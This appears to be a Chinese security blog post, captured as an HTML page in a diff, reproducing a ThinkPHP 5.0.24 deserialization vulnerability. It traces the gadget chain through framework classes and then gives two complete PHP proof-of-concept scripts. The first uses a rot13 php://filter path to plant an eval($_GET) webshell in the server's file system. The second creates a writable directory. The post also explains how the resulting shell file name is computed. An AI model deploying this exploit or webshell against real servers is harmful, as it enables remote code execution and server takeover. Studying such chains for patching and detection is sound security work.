@@ -1,0 +1,788 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Thinkphp 5.0.24 反序列化（任意文件写入）漏洞一、漏洞简介该漏洞只能在linux服务器上使用，win无法适用。 二、漏洞影响Thinkphp 5.0.24 三、复现过程漏洞分析这个漏洞是框架的反序列化漏洞，只有二次开发实现了反序列化才可以利用，所以先构造漏洞代码，在&#x2F;application&#x2F;index&#x2F;controller&#x2F;Index.php中添加如下代码 class Index &amp;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/Thinkphp/Thinkphp%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/Thinkphp%205.0.24%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:description" content="Thinkphp 5.0.24 反序列化（任意文件写入）漏洞一、漏洞简介该漏洞只能在linux服务器上使用，win无法适用。 二、漏洞影响Thinkphp 5.0.24 三、复现过程漏洞分析这个漏洞是框架的反序列化漏洞，只有二次开发实现了反序列化才可以利用，所以先构造漏洞代码，在&#x2F;application&#x2F;index&#x2F;controller&#x2F;Index.php中添加如下代码 class Index &amp;">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Thinkphp5.0.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId25.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Thinkphp5.0.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId27.gif">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Thinkphp5.0.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId29.jpg">
+<meta property="og:image" content="https://she11c0de.github.io/resource/Thinkphp5.0.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId30.jpg">
+<meta property="article:published_time" content="2022-07-08T06:26:05.357Z">
+<meta property="article:modified_time" content="2022-07-08T07:24:51.403Z">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://she11c0de.github.io/resource/Thinkphp5.0.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId25.png">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-Thinkphp/Thinkphp 反序列化漏洞/Thinkphp 5.0.24 反序列化漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Thinkphp/Thinkphp%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/Thinkphp%205.0.24%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:05.357Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Thinkphp-5-0-24-反序列化（任意文件写入）漏洞"><a href="#Thinkphp-5-0-24-反序列化（任意文件写入）漏洞" class="headerlink" title="Thinkphp 5.0.24 反序列化（任意文件写入）漏洞"></a>Thinkphp 5.0.24 反序列化（任意文件写入）漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>该漏洞只能在linux服务器上使用，win无法适用。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Thinkphp 5.0.24</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>这个漏洞是框架的反序列化漏洞，只有二次开发实现了反序列化才可以利用，所以先构造漏洞代码，在/application/index/controller/Index.php中添加如下代码</p>
+<pre><code>class Index
+&#123;
+    public function index()
+    &#123;
+        echo &quot;Welcome thinkphp 5.0.24&quot;;
+        unserialize(base64_decode($_GET[&#39;a&#39;]));
+    &#125;
+&#125;
+</code></pre>
+<p>Thinkphp<br>5.0.x反序列化最后触发RCE，要调用的<code>Request</code>类<code>__call</code>方法，所以直接找可用的<code>__call</code>方法</p>
+<p>这里选择了Output类(/thinkphp/library/think/console/Output.php)，因为其中的block可以当作跳板</p>
+<pre><code>public function __call($method, $args)
+&#123;
+    if (in_array($method, $this-&gt;styles)) &#123;
+        array_unshift($args, $method);
+        return call_user_func_array([$this, &#39;block&#39;], $args);
+    &#125;
+
+    if ($this-&gt;handle &amp;&amp; method_exists($this-&gt;handle, $method)) &#123;
+        return call_user_func_array([$this-&gt;handle, $method], $args);
+    &#125; else &#123;
+        throw new Exception(&#39;method not exists:&#39; . __CLASS__ . &#39;-&gt;&#39; . $method);
+    &#125;
+&#125;
+</code></pre>
+<p>从头开始分析，首先全局搜索<code>__destruct</code>，选择Windows类(/thinkphp/library/think/process/pipes/Windows.php)，代码如下</p>
+<pre><code>public function __destruct()
+&#123;
+    $this-&gt;close();
+    $this-&gt;removeFiles();
+&#125;
+</code></pre>
+<p>跟进removeFiles</p>
+<pre><code>private function removeFiles()
+&#123;
+    foreach ($this-&gt;files as $filename) &#123;
+        if (file_exists($filename)) &#123;
+            @unlink($filename);
+        &#125;
+    &#125;
+    $this-&gt;files = [];
+&#125;
+</code></pre>
+<p>file_exists可以触发<code>__tostring</code>，所以寻找<code>__tostring</code>，找到了Model类(/thinkphp/library/think/Model.php)</p>
+<pre><code>public function __toString()
+&#123;
+    return $this-&gt;toJson();
+&#125;
+</code></pre>
+<p>跟进toJson</p>
+<pre><code>public function toJson($options = JSON_UNESCAPED_UNICODE)
+&#123;
+    return json_encode($this-&gt;toArray(), $options);
+&#125;
+</code></pre>
+<p>跟进toArray</p>
+<pre><code>public function toArray()
+&#123;
+    $item    = [];
+    $visible = [];
+    $hidden  = [];
+
+    $data = array_merge($this-&gt;data, $this-&gt;relation);
+    
+    ...
+    // 追加属性（必须定义获取器）
+    if (!empty($this-&gt;append)) &#123;
+        foreach ($this-&gt;append as $key =&gt; $name) &#123;
+            if (is_array($name)) &#123;
+                ...
+            &#125; elseif (strpos($name, &#39;.&#39;)) &#123;
+                ...
+            &#125; else &#123;
+                $relation = Loader::parseName($name, 1, false);
+                if (method_exists($this, $relation)) &#123;
+                    $modelRelation = $this-&gt;$relation();
+                    $value         = $this-&gt;getRelationData($modelRelation);
+
+                    if (method_exists($modelRelation, &#39;getBindAttr&#39;)) &#123;
+                        $bindAttr = $modelRelation-&gt;getBindAttr();
+                        if ($bindAttr) &#123;
+                            foreach ($bindAttr as $key =&gt; $attr) &#123;
+                                $key = is_numeric($key) ? $attr : $key;
+                                if (isset($this-&gt;data[$key])) &#123;
+                                    throw new Exception(&#39;bind attr has exists:&#39; . $key);
+                                &#125; else &#123;
+                                    $item[$key] = $value ? $value-&gt;getAttr($attr) : null;
+                                &#125;
+                            &#125;
+                            continue;
+                        &#125;
+                    &#125;
+                    $item[$name] = $value;
+                &#125; else &#123;
+                    $item[$name] = $this-&gt;getAttr($name);
+                &#125;
+            &#125;
+        &#125;
+    &#125;
+    return !empty($item) ? $item : [];
+&#125;
+</code></pre>
+<p>由于我们的目的是执行<code>__call</code>，所以要找函数调用的点，在toArray里有三处</p>
+<p><img src="/resource/Thinkphp5.0.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId25.png"></p>
+<p>然后看这三处哪里可控，经调试第三处可控，需要满足的条件是</p>
+<pre><code>if (!empty($this-&gt;append))
+if (method_exists($this, $relation))
+if (method_exists($modelRelation, &#39;getBindAttr&#39;))
+if ($bindAttr)
+</code></pre>
+<p>且不满足</p>
+<pre><code>if (is_array($name))
+elseif (strpos($name, &#39;.&#39;))
+if (isset($this-&gt;data[$key]))
+</code></pre>
+<p>才能够进入到第三处，首先需要满足$relation是Model内的方法，然后经过如下赋值</p>
+<pre><code>$modelRelation = $this-&gt;$relation();
+$value         = $this-&gt;getRelationData($modelRelation);
+</code></pre>
+<p>需要满足$modelRelation可控，经过查找，可以将$modelRelation设为getError</p>
+<pre><code>public function getError()
+&#123;
+    return $this-&gt;error;
+&#125;
+</code></pre>
+<p>然后跟进getRelationDate</p>
+<pre><code>protected function getRelationData(Relation $modelRelation)
+&#123;
+    if ($this-&gt;parent &amp;&amp; !$modelRelation-&gt;isSelfRelation() &amp;&amp; get_class($modelRelation-&gt;getModel()) == get_class($this-&gt;parent)) &#123;
+        $value = $this-&gt;parent;
+    &#125; else &#123;
+        // 首先获取关联数据
+        if (method_exists($modelRelation, &#39;getRelation&#39;)) &#123;
+            $value = $modelRelation-&gt;getRelation();
+        &#125; else &#123;
+            throw new BadMethodCallException(&#39;method not exists:&#39; . get_class($modelRelation) . &#39;-&gt; getRelation&#39;);
+        &#125;
+    &#125;
+    return $value;
+&#125;
+</code></pre>
+<p>这里需要$modelRelation为Relation类型。全局查找getRelation方法且为Relation类型的类，找到了HasOne(/thinkphp/library/think/model/relation/HasOne.php)</p>
+<pre><code>public function getRelation($subRelation = &#39;&#39;, $closure = null)
+&#123;
+    // 执行关联定义方法
+    $localKey = $this-&gt;localKey;
+    if ($closure) &#123;
+        call_user_func_array($closure, [ &amp; $this-&gt;query]);
+    &#125;
+    // 判断关联类型执行查询
+    $relationModel = $this-&gt;query
+        -&gt;removeWhereField($this-&gt;foreignKey)
+        -&gt;where($this-&gt;foreignKey, $this-&gt;parent-&gt;$localKey)
+        -&gt;relation($subRelation)
+        -&gt;find();
+
+    if ($relationModel) &#123;
+        $relationModel-&gt;setParent(clone $this-&gt;parent);
+    &#125;
+
+    return $relationModel;
+&#125;
+</code></pre>
+<p>可以看到这些条件都是满足的，然后看getBindAttr，发现在OneToOne类中是可控的</p>
+<pre><code>public function getBindAttr()
+&#123;
+    return $this-&gt;bindAttr;
+&#125;
+</code></pre>
+<p>所以代码执行到</p>
+<pre><code>$item[$key] = $value ? $value-&gt;getAttr($attr) : null;
+</code></pre>
+<p>就可以调用Output类的<code>__call</code>方法，调用payload如下</p>
+<pre><code>namespace think&#123;
+    use think\console\Output;
+    use think\model\relation\HasOne;
+    abstract class Model&#123;
+        protected $relation;
+        protected $append = [&quot;1&quot;];
+        protected $error;
+        protected $parent;
+        public function __construct()
+        &#123;
+            $this-&gt;parent = new Output();
+            $this-&gt;relation = [&quot;getError&quot;=&gt;&quot;getError&quot;];
+            $this-&gt;append = [&quot;getError&quot;=&gt;&quot;getError&quot;];
+            $this-&gt;error = new HasOne();
+            $this-&gt;data = [&quot;key&quot;=&gt;&quot;ls&quot;]; ;
+        &#125;
+    &#125;
+&#125;
+
+namespace think\db&#123;
+    use think\console\Output;
+    class Query
+    &#123;
+        protected $model;
+        public function __construct()
+        &#123;
+            $this-&gt;model = new Output();
+        &#125;
+    &#125;
+&#125;
+
+namespace think\model\relation&#123;
+    use think\db\Query;
+    use think\model\Relation;
+    abstract class OneToOne extends Relation
+    &#123;
+        protected $query;
+        protected $bindAttr = [];
+        public function __construct()
+        &#123;
+        &#125;
+    &#125;
+
+    class HasOne extends OneToOne
+    &#123;
+        protected $query;
+        protected $bindAttr = [];
+        public function __construct()
+        &#123;
+            $this-&gt;query = new Query();
+            $this-&gt;bindAttr = [&quot;1&quot;=&gt;&quot;1&quot;];
+        &#125;
+    &#125;
+&#125;
+</code></pre>
+<p>然后接着看Output，在<code>__call</code>中调用block</p>
+<pre><code>protected function block($style, $message)
+&#123;
+    $this-&gt;writeln(&quot;&lt;&#123;$style&#125;&gt;&#123;$message&#125;&lt;/$style&gt;&quot;);
+&#125;
+</code></pre>
+<p>继续writeln</p>
+<pre><code>public function writeln($messages, $type = self::OUTPUT_NORMAL)
+&#123;
+    $this-&gt;write($messages, true, $type);
+&#125;
+</code></pre>
+<p>write</p>
+<pre><code>public function write($messages, $newline = false, $type = self::OUTPUT_NORMAL)
+&#123;
+    $this-&gt;handle-&gt;write($messages, $newline, $type);
+&#125;
+</code></pre>
+<p>而$this-&gt;handle是可控的，继续全局搜索write，寻找可控的点，找到了/thinkphp/library/think/session/driver/Memcached.php</p>
+<pre><code>public function write($sessID, $sessData)
+&#123;
+    return $this-&gt;handler-&gt;set($this-&gt;config[&#39;session_name&#39;] . $sessID, $sessData, $this-&gt;config[&#39;expire&#39;]);
+&#125;
+</code></pre>
+<p>这样就有找到了一个跳板set，然后继续找可以写入文件的方式，找到了/thinkphp/library/think/cache/driver/File.php</p>
+<pre><code>public function set($name, $value, $expire = null)
+    &#123;
+        if (is_null($expire)) &#123;
+            $expire = $this-&gt;options[&#39;expire&#39;];
+        &#125;
+        if ($expire instanceof \DateTime) &#123;
+            $expire = $expire-&gt;getTimestamp() - time();
+        &#125;
+        $filename = $this-&gt;getCacheKey($name, true);
+        if ($this-&gt;tag &amp;&amp; !is_file($filename)) &#123;
+            $first = true;
+        &#125;
+        $data = serialize($value);
+        if ($this-&gt;options[&#39;data_compress&#39;] &amp;&amp; function_exists(&#39;gzcompress&#39;)) &#123;
+            //数据压缩
+            $data = gzcompress($data, 3);
+        &#125;
+        $data   = &quot;&lt;?php\n//&quot; . sprintf(&#39;%012d&#39;, $expire) . &quot;\n exit();?&gt;\n&quot; . $data;
+        $result = file_put_contents($filename, $data);
+        if ($result) &#123;
+            isset($first) &amp;&amp; $this-&gt;setTagItem($filename);
+            clearstatcache();
+            return true;
+        &#125; else &#123;
+            return false;
+        &#125;
+    &#125;
+</code></pre>
+<p>此处$filename可控，跟进getCacheKey</p>
+<pre><code>protected function getCacheKey($name, $auto = false)
+&#123;
+    $name = md5($name);
+    if ($this-&gt;options[&#39;cache_subdir&#39;]) &#123;
+        // 使用子目录
+        $name = substr($name, 0, 2) . DS . substr($name, 2);
+    &#125;
+    if ($this-&gt;options[&#39;prefix&#39;]) &#123;
+        $name = $this-&gt;options[&#39;prefix&#39;] . DS . $name;
+    &#125;
+    $filename = $this-&gt;options[&#39;path&#39;] . $name . &#39;.php&#39;;
+    $dir      = dirname($filename);
+
+    if ($auto &amp;&amp; !is_dir($dir)) &#123;
+        mkdir($dir, 0755, true);
+    &#125;
+    return $filename;
+&#125;
+</code></pre>
+<p>回来继续看$data，从传入的$value获取，但是在之前writeln处已经传入了true，而且不可控，只能继续往下看，可以看到当成功写入文件时，会调用setTagItem方法，跟进</p>
+<pre><code>protected function setTagItem($name)
+&#123;
+    if ($this-&gt;tag) &#123;
+        $key       = &#39;tag_&#39; . md5($this-&gt;tag);
+        $this-&gt;tag = null;
+        if ($this-&gt;has($key)) &#123;
+            $value   = explode(&#39;,&#39;, $this-&gt;get($key));
+            $value[] = $name;
+            $value   = implode(&#39;,&#39;, array_unique($value));
+        &#125; else &#123;
+            $value = $name;
+        &#125;
+        $this-&gt;set($key, $value, 0);
+    &#125;
+&#125;
+</code></pre>
+<p>又调用了一次set，且此处两个参数都是可控的，所以可以在文件名处搞事情，通过编码然后将文件名写入shell中</p>
+<h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><pre><code>&lt;?php
+namespace think\process\pipes;
+use think\model\Pivot;
+class Pipes&#123;
+
+&#125;
+
+class Windows extends Pipes&#123;
+    private $files = [];
+
+    function __construct()&#123;
+        $this-&gt;files = [new Pivot()];
+    &#125;
+&#125;
+
+namespace think\model;#Relation
+use think\db\Query;
+abstract class Relation&#123;
+    protected $selfRelation;
+    protected $query;
+    function __construct()&#123;
+        $this-&gt;selfRelation = false;
+        $this-&gt;query = new Query();#class Query
+    &#125;
+&#125;
+
+namespace think\model\relation;#OneToOne HasOne
+use think\model\Relation;
+abstract class OneToOne extends Relation&#123;
+    function __construct()&#123;
+        parent::__construct();
+    &#125;
+
+&#125;
+class HasOne extends OneToOne&#123;
+    protected $bindAttr = [];
+    function __construct()&#123;
+        parent::__construct();
+        $this-&gt;bindAttr = [&quot;no&quot;,&quot;123&quot;];
+    &#125;
+&#125;
+
+namespace think\console;#Output
+use think\session\driver\Memcached;
+class Output&#123;
+    private $handle = null;
+    protected $styles = [];
+    function __construct()&#123;
+        $this-&gt;handle = new Memcached();//目的调用其write()
+        $this-&gt;styles = [&#39;getAttr&#39;];
+    &#125;
+&#125;
+
+namespace think;#Model
+use think\model\relation\HasOne;
+use think\console\Output;
+use think\db\Query;
+abstract class Model&#123;
+    protected $append = [];
+    protected $error;
+    public $parent;#修改处
+    protected $selfRelation;
+    protected $query;
+    protected $aaaaa;
+
+    function __construct()&#123;
+        $this-&gt;parent = new Output();#Output对象,目的是调用__call()
+        $this-&gt;append = [&#39;getError&#39;];
+        $this-&gt;error = new HasOne();//Relation子类,且有getBindAttr()
+        $this-&gt;selfRelation = false;//isSelfRelation()
+        $this-&gt;query = new Query();
+
+    &#125;
+&#125;
+
+namespace think\db;#Query
+use think\console\Output;
+class Query&#123;
+    protected $model;
+    function __construct()&#123;
+        $this-&gt;model = new Output();
+    &#125;
+&#125;
+
+namespace think\session\driver;#Memcached
+use think\cache\driver\File;
+class Memcached&#123;
+    protected $handler = null;
+    function __construct()&#123;
+        $this-&gt;handler = new File();//目的调用File-&gt;set()
+    &#125;
+&#125;
+namespace think\cache\driver;#File
+class File&#123;
+    protected $options = [];
+    protected $tag;
+    function __construct()&#123;
+        $this-&gt;options = [
+        &#39;expire&#39;        =&gt; 0,
+        &#39;cache_subdir&#39;  =&gt; false,
+        &#39;prefix&#39;        =&gt; &#39;&#39;,
+        &#39;path&#39;          =&gt; &#39;php://filter/write=string.rot13/resource=./&lt;?cuc cucvasb();riny($_TRG[pzq]);?&gt;&#39;,
+        &#39;data_compress&#39; =&gt; false,
+        ];
+        $this-&gt;tag = true;
+    &#125;
+&#125;
+
+namespace think\model;
+use think\Model;
+class Pivot extends Model&#123;
+
+
+&#125;
+use think\process\pipes\Windows;
+echo base64_encode(serialize(new Windows()));
+</code></pre>
+<p>该poc仅可在linux下使用，Windows对文件名有限制。</p>
+<p>生成文件名规则：</p>
+<pre><code>md5(&#39;tag_&#39;.md5($this-&gt;tag))
+即:
+md5(&#39;tag_c4ca4238a0b923820dcc509a6f75849b&#39;)
+=&gt;3b58a9545013e88c7186db11bb158c44
+=&gt;
+&lt;?cuc cucvasb();riny($_TRG[pzq]);?&gt; + 3b58a9545013e88c7186db11bb158c44
+最终文件名：
+&lt;?cuc cucvasb();riny($_TRG[pzq]);?&gt;3b58a9545013e88c7186db11bb158c44.php
+</code></pre>
+<p>在漏洞利用时需注意目录读写权限，可先控制options[‘path’] =<br>‘./demo/‘，利用框架创建一个755文件夹（前提是具有权限）</p>
+<p>我们可以稍微修改下 <strong>payload</strong> 用于创建一个 <strong>0755</strong><br>权限的目录（这里利用的是 <strong>think\cache\driver\File:getCacheKey()</strong><br>中的 <strong>mkdir</strong> 函数），然后再往这个目录写文件。</p>
+<p><img src="/resource/Thinkphp5.0.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId27.gif"></p>
+<h3 id="poc-创建demo目录"><a href="#poc-创建demo目录" class="headerlink" title="poc 创建demo目录"></a>poc 创建demo目录</h3><pre><code>&lt;?php
+namespace think\process\pipes;
+use think\model\Pivot;
+class Pipes&#123;
+
+&#125;
+
+class Windows extends Pipes&#123;
+    private $files = [];
+
+    function __construct()&#123;
+        $this-&gt;files = [new Pivot()];
+    &#125;
+&#125;
+
+namespace think\model;#Relation
+use think\db\Query;
+abstract class Relation&#123;
+    protected $selfRelation;
+    protected $query;
+    function __construct()&#123;
+        $this-&gt;selfRelation = false;
+        $this-&gt;query = new Query();#class Query
+    &#125;
+&#125;
+
+namespace think\model\relation;#OneToOne HasOne
+use think\model\Relation;
+abstract class OneToOne extends Relation&#123;
+    function __construct()&#123;
+        parent::__construct();
+    &#125;
+
+&#125;
+class HasOne extends OneToOne&#123;
+    protected $bindAttr = [];
+    function __construct()&#123;
+        parent::__construct();
+        $this-&gt;bindAttr = [&quot;no&quot;,&quot;123&quot;];
+    &#125;
+&#125;
+
+namespace think\console;#Output
+use think\session\driver\Memcached;
+class Output&#123;
+    private $handle = null;
+    protected $styles = [];
+    function __construct()&#123;
+        $this-&gt;handle = new Memcached();//目的调用其write()
+        $this-&gt;styles = [&#39;getAttr&#39;];
+    &#125;
+&#125;
+
+namespace think;#Model
+use think\model\relation\HasOne;
+use think\console\Output;
+use think\db\Query;
+abstract class Model&#123;
+    protected $append = [];
+    protected $error;
+    public $parent;#修改处
+    protected $selfRelation;
+    protected $query;
+    protected $aaaaa;
+
+    function __construct()&#123;
+        $this-&gt;parent = new Output();#Output对象,目的是调用__call()
+        $this-&gt;append = [&#39;getError&#39;];
+        $this-&gt;error = new HasOne();//Relation子类,且有getBindAttr()
+        $this-&gt;selfRelation = false;//isSelfRelation()
+        $this-&gt;query = new Query();
+
+    &#125;
+&#125;
+
+namespace think\db;#Query
+use think\console\Output;
+class Query&#123;
+    protected $model;
+    function __construct()&#123;
+        $this-&gt;model = new Output();
+    &#125;
+&#125;
+
+namespace think\session\driver;#Memcached
+use think\cache\driver\File;
+class Memcached&#123;
+    protected $handler = null;
+    function __construct()&#123;
+        $this-&gt;handler = new File();//目的调用File-&gt;set()
+    &#125;
+&#125;
+namespace think\cache\driver;#File
+class File&#123;
+    protected $options = [];
+    protected $tag;
+    function __construct()&#123;
+        $this-&gt;options = [
+        &#39;expire&#39;        =&gt; 0,
+        &#39;cache_subdir&#39;  =&gt; false,
+        &#39;prefix&#39;        =&gt; &#39;&#39;,
+        &#39;path&#39;          =&gt; &#39;./demo/&#39;,
+        &#39;data_compress&#39; =&gt; false,
+        ];
+        $this-&gt;tag = true;
+    &#125;
+&#125;
+
+namespace think\model;
+use think\Model;
+class Pivot extends Model&#123;
+
+
+&#125;
+use think\process\pipes\Windows;
+echo base64_encode(serialize(new Windows()));
+</code></pre>
+<p><img src="/resource/Thinkphp5.0.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId29.jpg"></p>
+<p><img src="/resource/Thinkphp5.0.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/media/rId30.jpg"></p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote>
+<p><a target="_blank" rel="noopener" href="http://althims.com/2020/02/07/thinkphp-5-0-24-unserialize/">http://althims.com/2020/02/07/thinkphp-5-0-24-unserialize/</a></p>
+<p><a target="_blank" rel="noopener" href="http://pines404.online/2020/01/20/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/ThinkPHP/ThinkPHP5.0.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/">http://pines404.online/2020/01/20/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/ThinkPHP/ThinkPHP5.0.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7082">https://xz.aliyun.com/t/7082</a></p>
+</blockquote>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Thinkphp/Thinkphp%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/Thinkphp%205.0.24%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qwy900j3y8v1gmrph6rn" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/07/07/Thinkphp/Thinkphp%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/Thinkphp%205.1.1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE%E6%9E%84%E9%80%A0/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/07/Thinkphp/Thinkphp%206.x%20%E6%BC%8F%E6%B4%9E/Thinkphp%20_%206.0.2%20session%20id%E6%9C%AA%E4%BD%9C%E8%BF%87%E6%BB%A4%E5%AF%BC%E8%87%B4getshell/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
